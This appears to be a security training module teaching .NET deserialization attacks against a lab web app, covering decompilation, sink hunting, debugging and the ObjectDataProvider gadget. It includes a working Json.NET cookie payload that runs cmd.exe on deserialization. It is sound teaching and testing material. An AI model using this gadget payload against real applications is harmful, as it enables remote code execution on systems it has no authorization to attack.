# Introduction

## Introduction to .NET Deserialization Attacks

Note: To fully grasp the concepts taught throughout this module, it is `expected` that you have some `basic understanding of deserialization vulnerabilities`, as well as `basic programming skills`, preferably in `C#/.NET`. Despite the module offering a pre-customized Windows VM for exploit development in some of the sections, having a local one will be beneficial.

Serialization is the process of converting an object from memory into a series of bytes. This data is then stored or transmitted over a network. Subsequently, it can be reconstructed later by a different program or in a different machine environment. Conversely, deserialization is the reverse action, wherein serialized data is reconstructed back into the original object. However, when an application deserializes user-controlled data, there is a risk of deserialization vulnerabilities occurring, which may be exploited to achieve objectives such as `remote code execution`, `object injection`, `arbitrary file read`, and `denial of service`.

Many programming languages, including Java, Ruby, Python, and PHP, offer serialization and deserialization runtime libraries. The [Introduction to Deserialization Attacks](https://academy.hackthebox.com/module/details/169) module covered fundamental deserialization attacks targeting web applications that use PHP and Python for the backend.

`C#`, Microsoft's flagship programming language, which utilizes the [.NET](https://learn.microsoft.com/en-us/dotnet/core/introduction) framework, also provides multiple serialization technologies; moreover, it is the primary language developers use while building Internet-connected apps with [ASP.NET Core](https://learn.microsoft.com/en-us/aspnet/core/introduction-to-aspnet-core?view=aspnetcore-7.0), a widely used web development framework employed by numerous websites worldwide.

Understanding how to identify and exploit .NET deserialization vulnerabilities not only strengthens our offensive security toolkit significantly but also provides insights into how threat actors achieved RCE after exploiting [CVE-2023-34362](https://www.hackthebox.com/blog/cve-2023-34362-explained) \- the MOVEit vulnerability that wreaked havoc globally.

There are three main [serialization technologies](https://learn.microsoft.com/en-us/dotnet/standard/serialization/) in `.NET`: [JSON serialization](https://learn.microsoft.com/en-us/dotnet/standard/serialization/system-text-json/overview), [XML and SOAP serialization](https://learn.microsoft.com/en-us/dotnet/standard/serialization/xml-and-soap-serialization), and [Binary serialization](https://learn.microsoft.com/en-us/previous-versions/dotnet/fundamentals/serialization/binary/binary-serialization):

- JSON serialization: Serialize .NET objects to and from JavaScript Object Notation (JSON).
- XML and SOAP serialization: Serialize only the public properties and fields of objects, not preserving type fidelity.
- Binary serialization: Records the complete state of the object and preserves type fidelity; when deserializing an object, an exact copy is created.

This module will cover deserialization attacks from a white-box approach, exploiting vulnerabilities caused by JSON, XML, and Binary serializers available to .NET developers.

We will start with the `decompilation` of a binary file to retrieve the source code, identify potentially vulnerable code sections, and set up `debugging` to aid in exploit development. Later, we will look into recreating two well-known `gadget chains` and using them to exploit three unique deserialization vulnerabilities in a custom application. Following this, we will look at the target application from a developer's point of view, and how the vulnerabilities we discover could be patched as well as how vulnerabilities could be avoided in the future. To finish off the module, you will be tasked with identifying and exploiting a custom deserialization vulnerability on your own.

Although deserialization vulnerabilities affect applications developed in many languages, for this module we will focus on `C#/.NET`. The techniques learned can be repurposed to work with other languages, such as `Java`.

## A Brief History of Deserialization Vulnerabilities

Deserialization vulnerabilities have been public knowledge for a long time, but interest exploded in 2015 when the `Apache Commons Collections` gadget was discovered. A brief timeline of milestones in deserialization vulnerabilities and attacks is listed below:

- `2007`: First registered deserialization vulnerability ( [CVE-2007-1701](https://nvd.nist.gov/vuln/detail/CVE-2007-1701)) allows attackers to execute arbitrary code via PHP's `session_decode`.
- `2011`: First "gadget-based" deserialization vulnerability ( [CVE-2011-2894](https://nvd.nist.gov/vuln/detail/CVE-2011-2894)) uses `Proxy` and `InvocationHandler` to achieve arbitrary code execution upon deserialization against the [Spring Framework](https://spring.io/projects/spring-framework/).
- `2012`: The White paper " [Are you my Type?](https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2012/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)" is published, discussing .NET serialization and [CVE-2012-0160](https://nvd.nist.gov/vuln/detail/CVE-2012-0160) which was a deserialization vulnerability in the .NET Framework leading to arbitrary code execution.
- `2015`: The Apache Commons Collections gadget is discovered ( [CVE-2015-4852](https://nvd.nist.gov/vuln/detail/CVE-2015-4852), [CVE-2015-7501](https://nvd.nist.gov/vuln/detail/CVE-2015-7501)) which allows attackers to achieve arbitrary code execution against many more Java applications. [ysoserial](https://github.com/frohoff/ysoserial) is released at [AppSecCali 2015](http://frohoff.github.io/appseccali-marshalling-pickles/) which allows attackers to automatically generate deserialization payloads using the Apache Commons Collections gadget.
- `2017`: The white paper ' [Friday the 13th JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)' was released, addressing deserialization vulnerabilities in .NET. It also introduced ' [YSoSerial.NET](https://github.com/pwntester/ysoserial.net),' a tool enabling attackers to generate deserialization payloads for `.NET` using a handful of gadgets.

## Target WebApp: TeeTrove

Throughout this module, we will analyze and attack a website named `TeeTrove`, an e-commerce marketplace specializing in selling custom-designed attire. We were commissioned by the company behind `TeeTrove` to conduct a `white-box penetration test` on the application with the goal being `remote code execution`. To conduct the assessment, the company provided us with the `compiled deployment files` and the necessary `credentials`.

![](https://academy.hackthebox.com/storage/modules/240/1/1.png)


# Decompiling .NET Applications

## Introduction

As input for this penetration test, we have been provided with the deployment files of the web application, which were written using `C#`/ `.NET` (see the file attached to the question at the bottom of this page). This is fine for us, since `.NET` applications are compiled into `intermediate code`, known as [Common Intermediate Language](https://learn.microsoft.com/en-us/dotnet/standard/managed-code) (also referred to as [Microsoft intermediate language](https://learn.microsoft.com/en-us/dotnet/standard/managed-execution-process#compiling_to_msil) ( `MSIL`) or `Intermediate Language` ( `IL`)), which, unless obfuscated, typically decompiles very nicely, resulting in code very similar to the original.

There is a large selection of tools that can be used to decompile `.NET` applications; popular ones include:

1. [Jet Brains dotPeek](https://www.jetbrains.com/decompiler/) (Free, Windows-only)
2. [ILSpy](https://github.com/icsharpcode/ILSpy) (Open-source, Cross-platform)

Note: This and the upcoming two sections provide a pre-customized Windows VM with all the required tools and customizations; utilize it to your advantage throughout the module. However, it is also recommended that you know how to set up these required tools yourself.

## dotPeek

#### Installing dotPeek

Let's install `dotPeek` so that we can decompile the target application. We can download the installer for free from [Jet Brain's Website](https://www.jetbrains.com/decompiler/) and start the installation process. During installation, we can `skip` all products except for `dotPeek`.

![image](https://academy.hackthebox.com/storage/modules/240/2/1.png)

Alternatively, we can simply select the `portable` version from the same [download page](https://www.jetbrains.com/decompiler/) to skip any installation process.

#### Decompiling with dotPeek

Once we have `dotPeek` open, we can select `File > Open` and then select `bin\TeeTrove.dll` in the file explorer. At this point, `dotPeek` will add the assembly and class list to the `Assembly Explorer` on the left side of the window.

![image](https://academy.hackthebox.com/storage/modules/240/2/2.png)

From this pane, we can expand `namespaces` and double-click on `classes` to view the decompiled source code in the main window pane. Since decompilation is not a perfect process, there will be some code snippets that will look strange, like the line highlighted with the red rectangle in the image below.

![image](https://academy.hackthebox.com/storage/modules/240/2/3.png)

By right-clicking on the `TeeTrove` assembly in the `Assembly Explorer` window, we can select `Export to Project` to save the decompiled source files to disk (as a Visual Studio solution in this case). This can be useful later, in case you want to use another tool to analyze/search through the source code.

![image](https://academy.hackthebox.com/storage/modules/240/2/7.png)

## ILSpy

#### Installing ILSpy

We can download the latest `ILSpy` release by heading to the [project's GitHub repository's release page](https://github.com/icsharpcode/ILSpy/releases). If you would prefer a portable version, select the `selfcontained` ZIP file. If you would prefer to install `ILSpy`, then select the first `-x64.msi` file. Your browser may issue a warning about downloading a `MSI` file, but this can be ignored. Once downloaded, we can click through the installation process, keeping all default values.

#### Decompilng with ILSpy

Once installed, the decompilation process with `ILSpy` is very similar to `dotPeek`; hit `File > Open` and then select the DLL file `bin\TeeTrove.dll` in the file explorer window. The .NET assembly will be added to the `Assemblies` window on the left-hand side of the screen, and some assembly information will be displayed in the main window.

![image](https://academy.hackthebox.com/storage/modules/240/2/4.png)

Using the `Assemblies` window, similar to `dotPeek`, we can navigate the `namespaces` and `classes`, and we can select individual ones to view the decompiled source code in the main window. You may notice that the output varies from `dotPeek` in certain places, for example, the `Index` function below compared to the `Index` function according to `dotPeek` above. In this case, `ILSpy` gave us output that is closer to the original code.

![image](https://academy.hackthebox.com/storage/modules/240/2/5.png)

By right-clicking on the `TeeTrove` assembly in the `Assemblies` window, we can select `Save Code` to save the decompiled source files so that they can be opened with other tools.

![image](https://academy.hackthebox.com/storage/modules/240/2/6.png)

Note: Opting for TCP instead of UDP for the VPN connection to the Windows VM enhances connectivity and prevents (potential) network issues.


# Identifying Vulnerable Functions

## Introduction

Now that we have `TeeTrove` decompiled (either with `dotPeek` or `ILSpy`), we can start looking through the source code for potential vulnerabilities; in the case of this module that means we will be looking exclusively for potential `deserialization vulnerabilities` in the code base.

## (Potentially) Vulnerable Functions

There are many different data serializers available for `C#`/ `.NET`, including those dealing with `binary`, `YAML`, and `JSON` schemes. Luckily for us (attackers), many of these serializers can be vulnerable and may be exploited in a very similar fashion.

Below is a table of common `.NET` serializers (listed alphabetically), with respective examples of calls to their deserialization functions (and links to documentation). When conducting a penetration test with access to source code, searching for the example functions can be a good way to quickly identify potential deserialization vulnerabilities.

| Serializer | Example | Reference |
| --- | --- | --- |
| BinaryFormatter | `.Deserialize(...)` | [Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=net-7.0) |
| fastJSON | `JSON.ToObject(...)` | [GitHub](https://github.com/mgholam/fastJSON) |
| JavaScriptSerializer | `.Deserialize(...)` | [Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer?view=netframework-4.8.1) |
| Json.NET | `JsonConvert.DeserializeObject(...)` | [Newtonsoft](https://www.newtonsoft.com/json) |
| LosFormatter | `.Deserialize(...)` | [Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.web.ui.losformatter?view=netframework-4.8.1) |
| NetDataContractSerializer | `.ReadObject(...)` | [Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8.1) |
| ObjectStateFormatter | `.Deserialize(...)` | [Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.web.ui.objectstateformatter?view=netframework-4.8.1) |
| SoapFormatter | `.Deserialize(...)` | [Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter?view=netframework-4.8.1) |
| XmlSerializer | `.Deserialize(...)` | [Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=net-7.0) |
| YamlDotNet | `.Deserialize<...>(...)` | [GitHub](https://github.com/aaubry/YamlDotNet) |

#### ViewState

Aside from the functions listed above, there is a feature called `ViewState` which some `ASP.NET` applications use to maintain the state of a page. The process involves storing a serialized parameter in a cookie called `__VIEWSTATE` and it is sometimes possible to exploit this if the server is misconfigured. Attacks exploiting `ViewState` will not be covered in this module, but for the interested reader, the following resources cover the basics:

- [Exploiting Deserialization in ASP.NET via ViewState](https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [Exploiting ViewState Deserialization using blacklist3r and YSoSerial.NET](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net)

#### Black-Box

Depending on the type of engagement, we might not always have access to the application's source code or binary file. Therefore, to identify potential deserialization functions, we need to search for specific bytes or characters (referred to as `magic bytes`) in the data sent from the web client to the server.

For `.NET Framework` applications, we can keep an eye out for the following:

- Base64-encoded strings beginning with `AAEAAAD/////`
- Strings containing `$type`
- Strings containing `__type`
- Strings containing `TypeObject`

#### Not Always Vulnerable

It is important to keep in mind that `not every use of a deserialization library function may be vulnerable`! Suppose we want to create a class named `ExampleClass` that implements the function `Deserialize`. This function utilizes `JavaScriptSerializer` to deserialize a `Person` object (defined below) provided to the function as a string.

```csharp
public class Person
{
    public string Name { get; set; }
    public int Age { get; set; }
}

```

One way a developer might implement `ExampleClass` is like this:

```csharp
using System.Web.Script.Serialization;

public class ExampleClass
{
    public JavaScriptSerializer Serializer { get; set; }

    public Person Deserialize<Person>(string str)
    {
        return this.Serializer.Deserialize<Person>(str);
    }
}

```

Another developer may decide to implement the function slightly differently, and instantiate a new `JavaScriptSerializer` each time like this:

```csharp
using System.Web.Script.Serialization;

public class ExampleClass
{
    public Person Deserialize<Person>(string str)
    {
        JavaScriptSerializer serializer = new JavaScriptSerializer();
        return serializer.Deserialize<Person>(str);
    }
}

```

In this case, the difference is very small, and yet the first example is potentially vulnerable, while the second is completely safe. The reason for this is that in the first case, an attacker may be able to control the instantiation of the object's `Serializer`. If the `SimpleTypeResolver` is used when instantiating a `JavaScriptSerializer`, then the subsequent deserialization will be susceptible to exploitation.

```csharp
ExampleClass example = new ExampleClass();
example.Serializer = new JavaScriptSerializer(new SimpleTypeResolver());
example.Deserialize("...[Payload]...");

```

This is just one example (based on Microsoft's code analysis rule [CA2322](https://learn.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/ca2322)) of a slight difference in implementation leading to a potential vulnerability, but many others are affecting the various serializers. The main point to take away from this example is that `deserialization libraries` are not inherently vulnerable. Oftentimes, the context (in this case the type of Resolver) is important in determining the security of a code snippet.

## Hunting for Deserialization

At this point, we have `TreeTrove's` decompiled source code and a better understanding of what we want to look for to identify potential deserialization vulnerabilities.

We can either search through the assembly right inside `dotPeek`/ `ILSpy`, or through the exported decompiled code using tools such as IDEs or scripting languages. For example, let's use the `Select-String` PowerShell cmdlet to search for `.Deserialize(` like so.

```powershell
PS C:\> Select-String -Pattern "\.Deserialize\(" -Path "*/*" -Include "*.cs"

```

As you can see below, we already found two spots that are potentially vulnerable to deserialization attacks.

![image](https://academy.hackthebox.com/storage/modules/240/2/8.png)

In the upcoming sections, we will determine whether the deserialized objects are controlled by user input, and whether the use of the deserialization functions is indeed vulnerable.


# Debugging .NET Applications

## Introduction

Sometimes we want to be able to see how the target application handles data in `real-time`. For example, imagine we have identified a potential deserialization vulnerability, but the payload we are using doesn't work and we aren't sure why. By `debugging` the application, we can step through the relevant code `line-by-line` until we realize why the payload is not working.

Typically, debugging requires the source code of an application. However, when it comes to `.NET`, we can use another open-source tool called [dnSpy](https://github.com/dnSpyEx/dnSpy) to do the same with compiled assemblies.

## Running TeeTrove

#### Installing Internet Information Services (IIS)

The deployment files that we were provided for `TeeTrove` are not standalone, as we need another program to run the application. In this case, we will use `IIS` to serve the web application locally, so that we can debug it.

`IIS` comes by default with Windows, however, it may not be enabled by default on your installation. To enable `IIS`, open the `Start Menu` and search for `Turn Windows Features on or off`. Inside the window, we want to click on `Internet Information Services`. Next, expand the dropdown and ensure the following features are enabled, paying special attention to the ones highlighted in red:

![image](https://academy.hackthebox.com/storage/modules/240/2/9a.png)

Once the appropriate options are checked, we can click `OK` and Windows will automatically download any missing files.

#### Configuring IIS

Before we can configure `IIS`, we need to make sure the supplied deployment files are extracted somewhere the server can access, like `C:\inetpub\wwwroot`. Next, we need to modify `Web.config` so that the application can access the database file correctly; open `Web.config` in the text editor of your choice, scroll to the bottom of the file, and update the value of `Data Source` to the full path of the `TeeTrove.db` file in the same folder.

![image](https://academy.hackthebox.com/storage/modules/240/2/11.png)

Now we are ready to configure `IIS`. Open the `Start Menu` and search for `Internet Information Services (IIS) Manager`. Inside, right-click `Sites` and select `Add Website`. Fill out the popup window like shown below, and make sure that the Application Pool is set to `.NET v4.5`, otherwise, it will not serve the application correctly!

![image](https://academy.hackthebox.com/storage/modules/240/2/10a.png)

Hit `OK` and now `TeeTrove` should be accessible at [http://localhost:8000](http://localhost:8000).

![](https://academy.hackthebox.com/storage/modules/240/2/12.png)

And now there is just one final step to make sure we can write to the database. Browse to the location where the deployment files are, `right-click` the folder, and modify the permissions so that the `IIS_IUSRS` user has write permissions on the folder.

![image](https://academy.hackthebox.com/storage/modules/240/2/17.png)

## Debugging TeeTrove

#### Preparing the DLL Files for Debugging

Before we can get into debugging, we need to `"prep"` the files. By default, `IIS` makes debugging complicated by `optimizing` the assemblies. To prevent this from happening, we can use a `PowerShell` script to disable `optimization`.

Download the following [PowerShell Module](https://gist.github.com/richardszalay/59664cd302e66511618f51eaaa77db26), and run the following commands (replacing the last path with wherever you placed the application):

```powershell
PS C:\> Import-Module .\IISAssemblyDebugging.psm1
PS C:\> Enable-IISAssemblyDebugging C:\inetpub\wwwroot\TeeTrove.Publish\

```

#### Installing dnSpy

Now that we have `TeeTrove` running, and the application files are prepped for debugging, let's work on getting our debugging environment set up. For this, we will need to install [dnSpy](https://github.com/dnSpyEx/dnSpy). Head to the GitHub repository's `Releases` page, and then download the latest `-win64.zip` archive.

![image](https://academy.hackthebox.com/storage/modules/240/2/13.png)

Once downloaded, simply extract the archive and the tool is ready to be used!

#### Debugging TeeTrove with dnSpy

Finally, open up `dnSpy` as `Administrator`. The layout will be similar to both `dotPeek` and `ILSpy`; there is an `Assembly List` on the left-hand side, and the main window pane is where decompiled code will be displayed.

From the `File` menu, select `Open` and select `all` the `DLL` files in the application folder.

![image](https://academy.hackthebox.com/storage/modules/240/2/16a.png)

Next, select `Debug > Attach to Process` and look for `w3wp.exe`. If it does not appear in the list, send any request to the web application and click `Refresh`, it should show up.

![image](https://academy.hackthebox.com/storage/modules/240/2/15.png)

At this point, if everything was done correctly, debugging should be working. We can test this by opening `TeeTrove.Controllers.AuthController` and setting a breakpoint on `line 18`. We can try to load [http://localhost:8000/Auth/Login](http://localhost:8000/Auth/Login) in the browser, and the application should break, allowing us to step through lines and view the values of variables.

![image](https://academy.hackthebox.com/storage/modules/240/2/14.png)


# The ObjectDataProvider Gadget

## What is a Gadget?

During engagements, to achieve objectives such as arbitrary file writes or remote code execution through a deserialization attack, it is necessary to use a so-called `gadget`, or in some cases, a combination of gadgets called a `gadget chain`. A `gadget` is an object set up in a specific way so that it executes a desired set of actions upon deserialization, most importantly, in the context of attacks we want to carry out.

Note: Identifying `gadgets` (and vulnerable deserialization libraries) ourselves is `outside of the scope` of this module because it requires a lot of research, and so we will be relying on public findings and papers.

## ObjectDataProvider

#### What is ObjectDataProvider?

Let's look at a well-known gadget for `.NET`, which can be used to execute arbitrary commands using the `ObjectDataProvider` class.

According to [Microsoft's documentation](https://learn.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?view=windowsdesktop-7.0), the `ObjectDataProvider` class can be used to "wrap and create an object that can be used as a binding source". This description probably doesn't make a lot of sense, so let's elaborate a little bit. The `ObjectDataProvider` class is part of the [Windows Presentation Foundation](https://learn.microsoft.com/en-us/dotnet/desktop/wpf/overview/?view=netdesktop-7.0), which is a `.NET` framework for developing graphic user interfaces (GUIs) with `XAML` (Microsoft's variant of `XML`). Taking a look at an [example](https://learn.microsoft.com/en-us/dotnet/desktop/wpf/data/how-to-make-data-available-for-binding-in-xaml?view=netframeworkdesktop-4.8) that `Microsoft` provides (listed below), the description starts to make a bit more sense. We can see that in this case, a new `Person` object is created with the constructor parameter `"Joe"`, and that the `Name` property of the resulting object is accessed near the bottom of the document.

```xml
<Window
  xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
  xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
  xmlns:src="clr-namespace:SDKSample"
  xmlns:system="clr-namespace:System;assembly=mscorlib"
  SizeToContent="WidthAndHeight"
  Title="Simple Data Binding Sample">

  <Window.Resources>
    <ObjectDataProvider x:Key="myDataSource" ObjectType="{x:Type src:Person}">
      <ObjectDataProvider.ConstructorParameters>
        <system:String>Joe</system:String>
      </ObjectDataProvider.ConstructorParameters>
    </ObjectDataProvider>
    <SNIP>
  </Window.Resources>

  <Border Margin="25" BorderBrush="Aqua" BorderThickness="3" Padding="8">
    <DockPanel Width="200" Height="100">
      <SNIP>
      <TextBlock Text="{Binding Source={StaticResource myDataSource}, Path=Name}"/>
    </DockPanel>
  </Border>
</Window>

```

Most importantly, we notice that the object was created `without any function calls`! When we deserialize an object in `.NET` we can't execute any functions, so the fact that `ObjectDataProvider` does so automatically is very interesting for us as attackers.

#### How does it work?

Let's take a look at why this is possible. We can open `PresentationFramework.dll` in `ILSpy` to look at what goes on behind the scenes. Select `File > Open from GAC` to open a library from the `Global Assembly Cache`, in this case, `PresentationFramework`.

![image](https://academy.hackthebox.com/storage/modules/240/3/7.png)

Navigating to `System.Windows.Data` and then `ObjectProvider`, we can open the decompiled source code, and the first thing we notice is that `ObjectDataProvider` inherits `DataSourceProvider`.

![image](https://academy.hackthebox.com/storage/modules/240/3/3.png)

Scrolling down a bit to look at the `MethodName` field, we notice that the `Refresh` method is called when the value is set. This is important, because when an object is deserialized in `C#`, an empty instance is created and the properties are then set one by one, so this `Refresh` function will end up being called upon `deserialization`.

![image](https://academy.hackthebox.com/storage/modules/240/3/2.png)

`Refresh` is a method defined in `DataSourceProvider`, and we can see that it simply calls the `BeginQuery` method.

![image](https://academy.hackthebox.com/storage/modules/240/3/4.png)

`BeginQuery` is an empty method in `DataSourceProvider`, but it is overridden in `ObjectDataProvider`, so this is where the execution flow continues. Inside the implementation of `BeginQuery`, we can see that the `QueryWorker` function is called.

![image](https://academy.hackthebox.com/storage/modules/240/3/5.png)

Finally, we end up in the `QueryWorker` function in `ObjectDataProvider`, and we can see that an object instance is created, and additionally that a method is invoked if the `MethodName` parameter is defined.

![image](https://academy.hackthebox.com/storage/modules/240/3/6.png)

Going back to the [documentation](https://learn.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?view=windowsdesktop-7.0) again, we can see that `ObjectDataProvider` has the following fields (among others):

- `ObjectType`: Used to set the type of object to create an instance of
- `MethodName`: Set the name of a method to call when creating the object
- `MethodParameters`: The list of parameters to be passed to the method

So using just these three fields, we should be able to create an instance of an `arbitrary object`, and call an `arbitrary method` with `arbitrary parameters`, all without invoking a single method. We can test this out ourselves with a short `C#` program, which uses `ObjectDataProvider` to create an instance of `System.Diagnostics.Process` and invokes the `Start` method with parameters to launch the calculator application.

Note: Don't worry about actually compiling/running the program below, we will get to exploit development in the following sections.

```csharp
using System.Windows.Data;

namespace ODPExample
{
    internal class Program
    {
        static void Main(string[] args)
        {
            ObjectDataProvider odp = new ObjectDataProvider();
            odp.ObjectType = typeof(System.Diagnostics.Process);
            odp.MethodParameters.Add("C:\\Windows\\System32\\cmd.exe");
            odp.MethodParameters.Add("/c calc.exe");
            odp.MethodName = "Start";
        }
    }
}

```

Using `ObjectDataProvider`, we can execute arbitrary commands without invoking any methods directly/explicitly.

![image](https://academy.hackthebox.com/storage/modules/240/3/1.png)

#### Conclusion

We now have a `gadget` that enables `remote code execution` upon `deserialization`. This is an important part of exploiting `.NET` deserialization vulnerabilities, because we will typically can not use serialized data to directly invoke methods.


# Example 1: JSON

## Discovering the Vulnerability

Let's take a look at one of the potentially vulnerable function calls that we identified in an earlier section, specifically the call to `JsonConvert.DeserializeObject` in `Authentication.RememberMeUtil`.

![image](https://academy.hackthebox.com/storage/modules/240/3/8.png)

Based on the name of the class and related variables, we can assume this bit of code has to do with the application's `"remember me"` functionality. If we log into the website with the credentials `pentest:pentest` and the `"Remember me"` option checked, we can look at our cookies to spot the `"TTREMEMBER"` JSON cookie.

![image](https://academy.hackthebox.com/storage/modules/240/3/9.png)

Double-checking with the source code, we can confirm that this is indeed the cookie that is being deserialized in the `validateCookieAndReturnUser` method of `RememberMeUtil`, and that it is created in the `createCookie` method of the same class.

```csharp
public static readonly string REMEMBER_ME_COOKIE_NAME = "TTREMEMBER";

<SNIP>

public static HttpCookie createCookie(CustomMembershipUser user)
{
    RememberMe rememberMe = new RememberMe(user.Username, user.RememberToken);
    string jsonString = JsonConvert.SerializeObject(rememberMe);
    HttpCookie cookie = new HttpCookie(REMEMBER_ME_COOKIE_NAME, jsonString);
    cookie.Secure = true;
    cookie.HttpOnly = true;
    cookie.Expires = DateTime.Now.AddDays(30.0);
    return cookie;
}

```

Before we spend any more time reverse-engineering the system, let's check if this deserialization call is vulnerable or not. With a quick search, we will find the previously mentioned [Friday the 13th JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) whitepaper by Alvaro Muñoz and Oleksandr Mirosh. The paper discusses various Java and .NET serializers that utilize JSON and explores their vulnerabilities and when they are susceptible. On `page 5`, we can see the following paragraph about `Json.Net`, which is the specific library being used in `TeeTrove` to (de)serialize this cookie.

![image](https://academy.hackthebox.com/storage/modules/240/3/11.png)

According to the white paper, `Json.NET` will not deserialize data of the wrong type by default, which would prevent us from passing something like a serialized `ObjectDataProvider` object instead of a `RememberMe` object. However, by setting the `TypeNameHandling` to a non- `None` value, this behavior can be disabled. If we look at the relevant source code again, we will notice that `TypeNameHandling` is set to `All`, so it appears that this deserialization call should be vulnerable!

![image](https://academy.hackthebox.com/storage/modules/240/3/12.png)

Note: Now that we know setting `TypeNameHandling` can lead to deserialization vulnerabilities, we can search through source code for this term specifically in the future to find interesting lines.

## Developing the Exploit

At this point, we have reason to believe the call to `DeserializeObject` is vulnerable, so let's try to exploit it. We understand how we should be able to use `ObjectDataProvider` to execute arbitrary commands upon instantiation (deserialization), so let's create a serialized object we can replace the value of the cookie with to achieve `(remote) code execution`.

If you don't have `Visual Studio` installed, then this is the point where you should do so. You can download the latest version from [here](https://visualstudio.microsoft.com/vs/community/), just make sure the `.NET desktop environment` option is selected during the installation process so that the necessary files are downloaded and made available.

![image](https://academy.hackthebox.com/storage/modules/240/3/14.png)

With `Visual Studio` installed, we can open it and create a new `Console App (.NET Framework)`.

![image](https://academy.hackthebox.com/storage/modules/240/3/13.png)

We can reuse the code from the previous section to base our `ObjectDataProvider` object on.

```csharp
using System.Windows.Data;

namespace RememberMeExploit
{
    internal class Program
    {
        static void Main(string[] args)
        {
            ObjectDataProvider odp = new ObjectDataProvider();
            odp.ObjectType = typeof(System.Diagnostics.Process);
            odp.MethodParameters.Add("C:\\Windows\\System32\\cmd.exe");
            odp.MethodParameters.Add("/c calc.exe");
            odp.MethodName = "Start";
        }
    }
}

```

There will be an error regarding `ObjectDataProvider`. Visual Studio will not reference the necessary namespace by itself for this class, so it is necessary to hover over it, select `Show potential fixes` and then select `using System.Windows.Data; (from PresentationFramework)`

![image](https://academy.hackthebox.com/storage/modules/240/3/62.png)

Once that's cleared up, we can add the following lines to serialize the object with `Json.NET` and print it out to the console.

```csharp
JsonSerializerSettings settings = new JsonSerializerSettings()
{
    TypeNameHandling = TypeNameHandling.All
};
string json = JsonConvert.SerializeObject(odp, settings);
Console.WriteLine(json);

```

There will be another error, because `Json.NET` is not an official `Microsoft` package and is therefore not installed by default. If you are using your own Windows VM for this module, you may simply head down to the `Package Manager Console` and run the command `Install-Package Newtonsoft.Json` to install it.

```powershell
Install-Package Newtonsoft.Json

```

If you are following along on the provided Tools VM, then we will need to add a reference to the DLL file manually. First, extract the ZIP file `C:\Tools\Newton_Soft_Json.zip` to a destination of your choosing. Next, inside Visual Studio, navigate to `Project > Add Reference...`, select `Browse` and find `Bin\net45\Newtonsoft.Json.dll` from wherever you extracted the ZIP file to.

![image](https://academy.hackthebox.com/storage/modules/240/3/61.png)

Hit `Add` and then `Ok`, and the reference errors should be cleared up. Now, we can build the program and run it. A calculator will spawn; however, there will be no serialized object for us to copy. Instead, an error message will be displayed since the serializer cannot determine certain information due to the new process.

![image](https://academy.hackthebox.com/storage/modules/240/3/16.png)

Based on the error message above, the object was not serializable due to the system not being able to determine the `ExitCode`. We don't need the calculator to spawn now, we just want to see the serialized output, so let's change the value of `MethodName` from `Start` to `Start1`. The method `Start1` does not actually exist, and it should not result in any calculator being spawned. Therefore, ideally, we should obtain serialized JSON output that we can manually modify. This time when we run the program, we get this output:

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "ObjectType": "<SNIP>",
  "MethodName": "Start1",
  "MethodParameters": {
    "$type": "<SNIP>",
    "$values": [
      "C:\\Windows\\System32\\cmd.exe",
      "/c calc.exe"
    ]
  },
  "IsAsynchronous": false,
  "IsInitialLoadEnabled": true,
  "Data": null,
  "Error": {
    "$type": "System.MissingMethodException, mscorlib",
    "ClassName": "System.MissingMethodException",
    "Message": "Attempted to access a missing member.",
    "Data": null,
    "InnerException": null,
    "HelpURL": null,
    "StackTraceString": "   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)\r\n   at System.Windows.Data.ObjectDataProvider.InvokeMethodOnInstance(Exception& e)",
    "RemoteStackTraceString": null,
    "RemoteStackIndex": 0,
    "ExceptionMethod": "8\nInvokeMember\nmscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\nSystem.RuntimeType\nSystem.Object InvokeMember(System.String, System.Reflection.BindingFlags, System.Reflection.Binder, System.Object, System.Object[], System.Reflection.ParameterModifier[], System.Globalization.CultureInfo, System.String[])",
    "HResult": -2146233070,
    "Source": "mscorlib",
    "WatsonBuckets": null,
    "MMClassName": "System.Diagnostics.Process",
    "MMMemberName": "Start1",
    "MMSignature": null
  }
}

```

Taking a look at the JSON object, we can see that there is a long `Error` section due to `Start1` not being a valid method. We can just remove this and change `Start1` back to `Start` so that the correct method will be called when we deserialize the object. We can also remove the `IsAsynchronous`, `IsInitialLoadEnabled`, and `Data` fields since we don't require any specific values for these properties to achieve code execution:

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "ObjectType": "<SNIP>",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "<SNIP>",
    "$values": [
      "C:\\Windows\\System32\\cmd.exe",
      "/c calc.exe"
    ]
  }
}

```

We can now test this payload to make sure the calculator is spawned with the following lines of code:

```csharp
